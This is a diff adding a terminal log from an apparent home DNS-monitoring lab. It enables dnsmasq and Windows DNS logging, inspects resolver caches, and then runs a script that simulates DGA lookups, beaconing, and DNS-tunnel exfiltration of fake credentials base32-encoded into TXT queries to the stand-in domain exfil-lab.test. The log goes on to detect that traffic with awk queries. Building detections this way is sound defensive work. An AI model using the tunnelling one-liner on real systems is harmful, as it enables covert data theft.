@@ -1,0 +1,128 @@
+$ uci set dhcp.@dnsmasq[0].logqueries=1; uci commit dhcp; /etc/init.d/dnsmasq restart >/dev/null 2>&1; uci get dhcp.@dnsmasq[0].logqueries   # ← trên router wrt-nha
+1
+$ grep -v '^#' /etc/resolv.conf; resolvectl dns ens3   # ← trên android-7f3a
+
+nameserver 127.0.0.53
+options edns0 trust-ad
+search lan
+Link 2 (ens3): 192.168.56.1
+$ dig +short vnexpress.net; dig +short vnexpress.net; dig khong-co-ten-nay.tuoitre.vn | grep -o 'status: [A-Z]*'   # ← trên android-7f3a
+111.65.250.2
+111.65.250.2
+status: NXDOMAIN
+$ logread -e dnsmasq | grep "192.168.56.142/" | tail -n 9   # ← trên router wrt-nha
+Tue Nov 24 12:47:34 2026 daemon.info dnsmasq[1]: 1 192.168.56.142/41200 config android-7f3a.lan is NXDOMAIN
+Tue Nov 24 12:47:34 2026 daemon.info dnsmasq[1]: 2 192.168.56.142/46594 query[AAAA] android-7f3a.lan from 192.168.56.142
+Tue Nov 24 12:47:34 2026 daemon.info dnsmasq[1]: 2 192.168.56.142/46594 config android-7f3a.lan is NXDOMAIN
+Tue Nov 24 12:47:49 2026 daemon.info dnsmasq[1]: 1 192.168.56.142/45441 query[A] vnexpress.net from 192.168.56.142
+Tue Nov 24 12:47:49 2026 daemon.info dnsmasq[1]: 1 192.168.56.142/45441 forwarded vnexpress.net to 1.1.1.1
+Tue Nov 24 12:47:49 2026 daemon.info dnsmasq[1]: 1 192.168.56.142/45441 reply vnexpress.net is 111.65.250.2
+Tue Nov 24 12:47:49 2026 daemon.info dnsmasq[1]: 2 192.168.56.142/35601 query[A] khong-co-ten-nay.tuoitre.vn from 192.168.56.142
+Tue Nov 24 12:47:49 2026 daemon.info dnsmasq[1]: 2 192.168.56.142/35601 forwarded khong-co-ten-nay.tuoitre.vn to 1.1.1.1
+Tue Nov 24 12:47:49 2026 daemon.info dnsmasq[1]: 2 192.168.56.142/35601 reply khong-co-ten-nay.tuoitre.vn is NXDOMAIN
+PS> Clear-DnsClientCache; wevtutil sl Microsoft-Windows-DNS-Client/Operational /e:true; wevtutil gl Microsoft-Windows-DNS-Client/Operational | Select-String enabled
+
+enabled: true
+PS> Resolve-DnsName github.com -Type A | Select-Object Name,Type,TTL,IPAddress | Format-Table -AutoSize
+
+Name       Type TTL IPAddress
+----       ---- --- ---------
+github.com    A  16 20.205.243.166
+PS> Get-WinEvent -LogName Microsoft-Windows-DNS-Client/Operational -MaxEvents 40 | Where-Object { $_.Id -in 3006,3008,3020 -and $_.Message -match 'github' } | Select-Object -First 3 TimeCreated,Id,Message | Format-List
+
+
+TimeCreated : 11/24/2026 12:48:02 PM
+Id          : 3008
+Message     : DNS query is completed for the name github.com, type 1, query options 196616 with status 0 Results 20.205.243.166;
+
+TimeCreated : 11/24/2026 12:48:02 PM
+Id          : 3020
+Message     : Query response for name github.com, type 1, interface index 0 and network index 0 returned 0 with results 20.205.243.166;, client PID 2716, query blob 0x208751df590
+
+TimeCreated : 11/24/2026 12:48:02 PM
+Id          : 3006
+Message     : DNS query is called for the name github.com, type 1, query options 196616, Server List , isNetwork query 0, network index 0, interface index 0, is asynchronous query 0
+PS> ipconfig /displaydns | Select-Object -Skip 3 -First 11
+    github.com
+    ----------------------------------------
+    Record Name . . . . . : github.com
+    Record Type . . . . . : 1
+    Time To Live  . . . . : 4228
+    Data Length . . . . . : 4
+    Section . . . . . . . : Answer
+    A (Host) Record . . . : 20.205.243.166
+PS> Get-DnsClientCache | Select-Object -First 6 Entry,Type,Status,TimeToLive,Data | Format-Table -AutoSize
+$ logread -e dnsmasq | grep "query\[" | grep "from 192.168.56.177" | awk '{print $11}' | sort | uniq -c | sort -rn | head -n 8   # ← trên router wrt-nha
+      1 github.com
+$ resolvectl dns; resolvectl query example.com
+Global:
+Link 2 (ens3): 10.0.2.3
+Link 3 (ens4):
+example.com: 2606:4700:10::ac42:93f3                        -- link: ens3
+             2606:4700:10::6814:179a                        -- link: ens3
+             172.66.147.243                                 -- link: ens3
+             104.20.23.154                                  -- link: ens3
+
+-- Information acquired via protocol DNS in 18.8ms.
+-- Data is authenticated: no; Data was acquired via local or encrypted transport: no
+-- Data from: cache network
+$ sudo resolvectl statistics | sed -n '1,16p'
+Transactions
+                       Current Transactions:  0
+                         Total Transactions: 64
+
+Cache
+                         Current Cache Size:  2
+                                 Cache Hits:  9
+                               Cache Misses: 42
+
+Failure Transactions
+                             Total Timeouts:  3
+         Total Timeouts (Stale Data Served):  0
+                    Total Failure Responses:  0
+Total Failure Responses (Stale Data Served):  0
+
+DNSSEC Verdicts
+$ sudo resolvectl log-level debug; resolvectl query example.org >/dev/null; sudo resolvectl log-level info; journalctl -u systemd-resolved --since "-1 min" --no-pager -o cat | grep -E "Looking up|Cache miss|Positive cache hit|Transaction .* for <example.org IN A>" | head -n 5
+Looking up RR for example.org IN A.
+Looking up RR for example.org IN AAAA.
+Cache miss for example.org IN AAAA
+Cache miss for example.org IN A
+Looking up RR for lab7 IN A.
+$ cat dns-la.sh | tail -n 5; time ./dns-la.sh   # ← trên android-7f3a
+# 1) DGA: 25 tên ngẫu nhiên   2) "đường hầm" DNS: dữ liệu mã hoá base32 nhét vào nhãn TXT   3) gọi về đều đặn mỗi 15 giây, 8 lần
+for i in $(seq 1 25); do dig +short +tries=1 +time=1 "$(tr -dc a-z0-9 </dev/urandom | head -c 14).test" >/dev/null; done
+printf '%s' "tai-khoan=an;mat-khau=LabGia-123;the=4111111111111111" | base32 -w0 | tr -d = | tr A-Z a-z | fold -w 50 | nl -w1 -s' ' |
+  while read -r so manh; do dig +short +tries=1 +time=1 TXT "$manh.$so.t.exfil-lab.test" >/dev/null; done
+for i in $(seq 1 8); do dig +short +tries=1 +time=1 update.cdn-lab.test >/dev/null; sleep 15; done
+
+real	2m2.340s
+user	0m0.318s
+sys	0m0.435s
+$ sudo grep -c 'query\[' /var/log/remote/wrt-nha.log; sudo awk '$6 ~ /^query\[/ {print $9}' /var/log/remote/wrt-nha.log | sort | uniq -c | sort -rn
+38
+     37 192.168.56.142
+      1 192.168.56.177
+$ sudo awk '$6 ~ /^query\[/ && $7 ~ /\.test$/ {k = split($7, n, "."); print $9, n[k-1] "." n[k]}' /var/log/remote/wrt-nha.log | sort | uniq -c | sort -rn | head -n 5
+      8 192.168.56.142 cdn-lab.test
+      2 192.168.56.142 exfil-lab.test
+      1 192.168.56.142 z8fnm1bfupxd0i.test
+      1 192.168.56.142 z4olfyny0nlls4.test
+      1 192.168.56.142 xynvw7ih07i1hc.test
+$ sudo grep -c ' is NXDOMAIN' /var/log/remote/wrt-nha.log; sudo grep ' is NXDOMAIN' /var/log/remote/wrt-nha.log | head -n 3
+36
+2026-11-24T12:47:49+07:00 wrt-nha dnsmasq[1]: 2 192.168.56.142/35601 reply khong-co-ten-nay.tuoitre.vn is NXDOMAIN
+2026-11-24T12:48:20+07:00 wrt-nha dnsmasq[1]: 4 192.168.56.142/52544 config of0ab75jqyx8by.test is NXDOMAIN
+2026-11-24T12:48:20+07:00 wrt-nha dnsmasq[1]: 5 192.168.56.142/51540 config uuoxrsvrzsjm8h.test is NXDOMAIN
+$ sudo awk '$6 ~ /^query\[/ {split($7, n, "."); m = 0; for (i in n) if (length(n[i]) > m) m = length(n[i]); if (m >= 30) print $6, m, substr($7, 1, 64) "…"}' /var/log/remote/wrt-nha.log
+query[TXT] 50 orqwslllnbxwc3r5mfxdw3lboqwww2dbou6uyylci5uwcljrgi.1.t.exfil-lab…
+query[TXT] 35 ztw5dimu6timjrgeytcmjrgeytcmjrgeytc.2.t.exfil-lab.test…
+$ sudo awk '$6 == "query[A]" && $7 == "update.cdn-lab.test" { split(substr($1, 12, 8), t, ":"); s = t[1]*3600 + t[2]*60 + t[3]; if (p) printf "%s  +%ds\n", substr($1, 12, 8), s - p; else print substr($1, 12, 8), " (lần đầu)"; p = s }' /var/log/remote/wrt-nha.log
+12:48:21  (lần đầu)
+12:48:36  +15s
+12:48:51  +15s
+12:49:06  +15s
+12:49:21  +15s
+12:49:36  +15s
+12:49:52  +16s
+12:50:07  +15s
